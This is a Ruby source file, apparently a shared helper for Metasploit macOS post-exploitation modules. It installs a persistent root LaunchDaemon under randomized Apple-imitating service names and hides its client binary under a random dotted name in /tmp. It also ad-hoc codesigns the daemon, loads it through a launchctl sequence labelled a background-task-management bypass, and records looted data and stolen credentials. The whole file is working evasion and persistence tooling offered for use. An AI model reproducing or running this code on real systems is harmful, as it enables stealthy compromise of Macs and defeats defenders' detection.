#
# xpc_helper.rb — Shared library for XPC post-exploitation modules
#
# EDR Evasion:
#   - Dynamic daemon label (Apple-like, random per deploy)
#   - Dynamic client path (random hidden name)
#   - No hardcoded IoC strings
#   - Plist generated at runtime
#
# Author: Mr.Gedik
#

require 'json'
require 'base64'
require 'securerandom'

module Msf
module Post
module OSX
module XPCDaemon

  # Generate Apple-like service label — different every deploy
  def generate_label
    prefixes = %w[
      com.apple.security com.apple.coreservices com.apple.private
      com.apple.system com.apple.preferences com.apple.frameworks
      com.apple.analyticsd com.apple.metadata
    ]
    suffixes = %w[
      helper agent service monitor updater confighelper
      syncagent indexer validator checker worker
    ]
    "#{prefixes.sample}.#{suffixes.sample}.#{SecureRandom.hex(3)}"
  end

  # Current deployment state — persisted in datastore
  def service_label
    datastore['_XPC_LABEL'] || generate_label
  end

  def daemon_path
    "/Library/PrivilegedHelperTools/#{service_label}"
  end

  def plist_path
    "/Library/LaunchDaemons/#{service_label}.plist"
  end

  def client_path
    datastore['_XPC_CLIENT'] || "/tmp/.#{SecureRandom.hex(6)}"
  end

  # Check if daemon is running
  def xpc_status
    lbl = service_label
    out = cmd_exec("launchctl print system/#{lbl} 2>&1 | grep 'state ='")
    if out && out.include?('running')
      :running
    elsif out && out.include?('waiting')
      :waiting
    else
      :not_running
    end
  end

  # Check if client exists
  def xpc_client_exists?
    cp = datastore['_XPC_CLIENT']
    cp && file?(cp)
  end

  # Execute XPC client command with dynamic service name
  def xpc_exec(command, timeout: 30)
    cp = datastore['_XPC_CLIENT']
    lbl = datastore['_XPC_LABEL']

    unless cp && file?(cp)
      print_error("XPC client not found. Run xpc_daemon_install first.")
      return nil
    end

    raw = cmd_exec("#{cp} #{lbl} #{command}", timeout)
    return nil if raw.nil? || raw.empty?

    begin
      JSON.parse(raw)
    rescue JSON::ParserError => e
      print_error("JSON parse error: #{e.message}")
      nil
    end
  end

  # Execute and unwrap data (JSON keys: s=status, c=cmd, d=data)
  def xpc_exec!(command, timeout: 30)
    result = xpc_exec(command, timeout: timeout)
    return nil if result.nil?
    unless result['s'] == '1'
      print_error("XPC error: #{result['d'] || 'unknown'}")
      return nil
    end
    result['d']
  end

  # Store loot
  def xpc_store_loot(ltype, data, filename, description)
    store_loot("osx.#{ltype}", 'text/plain', session, data.to_s, filename, description)
  end

  # Report credential
  def xpc_report_cred(username, password, service_name, port = 0)
    cred = {
      origin_type: :session,
      session_id: session_db_id,
      post_reference_name: refname,
      private_type: :password,
      private_data: password,
      username: username,
      workspace_id: myworkspace_id
    }
    cred.merge!(address: session.session_host, port: port,
                service_name: service_name, protocol: 'tcp') if port > 0
    create_credential(cred)
  rescue => e
    print_warning("Credential store error: #{e.message}")
  end

  # Full deployment with dynamic naming
  def xpc_deploy(data_dir)
    daemon_src = ::File.join(data_dir, 'daemon')
    client_src = ::File.join(data_dir, 'client')

    # Check alternative layouts: <dir>/build/, universal names
    unless ::File.exist?(daemon_src) && ::File.exist?(client_src)
      if ::File.exist?(::File.join(data_dir, 'build', 'daemon'))
        daemon_src = ::File.join(data_dir, 'build', 'daemon')
        client_src = ::File.join(data_dir, 'build', 'client')
      end
    end
    daemon_src = ::File.join(data_dir, 'xpc_daemon_universal') unless ::File.exist?(daemon_src)
    client_src = ::File.join(data_dir, 'xpc_client_universal') unless ::File.exist?(client_src)

    unless ::File.exist?(daemon_src) && ::File.exist?(client_src)
      print_error("Binaries not found in #{data_dir}")
      print_error("Build: cd xpc-framework && make")
      return false
    end

    # Generate dynamic names
    label = generate_label
    dpath = "/Library/PrivilegedHelperTools/#{label}"
    ppath = "/Library/LaunchDaemons/#{label}.plist"
    cpath = "/tmp/.#{SecureRandom.hex(6)}"

    print_good("Generated label: #{label}")

    # Upload binaries with random names
    print_status("Deploying daemon...")
    tmp_daemon = "/tmp/.#{SecureRandom.hex(8)}"
    upload_file(tmp_daemon, daemon_src)
    upload_file(cpath, client_src)
    cmd_exec("chmod +x #{cpath}")

    # Install daemon
    cmd_exec("cp '#{tmp_daemon}' '#{dpath}'")
    cmd_exec("chmod 555 '#{dpath}'")
    cmd_exec("chown root:wheel '#{dpath}'")
    cmd_exec("rm -f '#{tmp_daemon}'")

    # Codesign with dynamic identifier
    cmd_exec("codesign -s - --force --identifier '#{label}' '#{dpath}'")

    # Generate plist at runtime — no static file
    plist = <<~PLIST
      <?xml version="1.0" encoding="UTF-8"?>
      <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
      <plist version="1.0"><dict>
        <key>Label</key><string>#{label}</string>
        <key>MachServices</key><dict><key>#{label}</key><true/></dict>
        <key>KeepAlive</key><true/>
        <key>RunAtLoad</key><true/>
        <key>Program</key><string>#{dpath}</string>
        <key>ProgramArguments</key><array>
          <string>#{dpath}</string>
          <string>#{label}</string>
        </array>
      </dict></plist>
    PLIST
    write_file(ppath, plist)
    cmd_exec("chmod 644 '#{ppath}'")
    cmd_exec("chown root:wheel '#{ppath}'")

    # Bootstrap + Kickstart (BTM bypass)
    print_status("Loading daemon (BTM bypass)...")
    cmd_exec("launchctl bootout system/#{label} 2>/dev/null; true")
    cmd_exec("launchctl bootstrap system '#{ppath}'")
    cmd_exec("launchctl kickstart -kp system/#{label}")

    # Store dynamic names in datastore for other modules
    datastore['_XPC_LABEL']  = label
    datastore['_XPC_CLIENT'] = cpath
    datastore['_XPC_DAEMON'] = dpath
    datastore['_XPC_PLIST']  = ppath

    sleep 1

    if xpc_status == :running
      print_good("Daemon running as root (label: #{label})")
      true
    else
      print_warning("Daemon may need manual kickstart")
      false
    end
  end

  # Clean uninstall
  def xpc_uninstall
    lbl = datastore['_XPC_LABEL'] || service_label
    dp  = datastore['_XPC_DAEMON'] || daemon_path
    pp  = datastore['_XPC_PLIST'] || plist_path
    cp  = datastore['_XPC_CLIENT'] || client_path

    cmd_exec("launchctl bootout system/#{lbl} 2>/dev/null; true")
    cmd_exec("rm -f '#{dp}' '#{pp}' '#{cp}'")
    print_good("Uninstalled (#{lbl})")
  end

  # Table printer
  def xpc_print_table(title, data)
    return unless data.is_a?(Hash)
    tbl = Rex::Text::Table.new(
      'Header'  => title,
      'Indent'  => 2,
      'Columns' => ['Key', 'Value']
    )
    data.sort.each { |k, v| tbl << [k, v.to_s[0..120]] }
    print_line(tbl.to_s)
  end

end
end
end
end
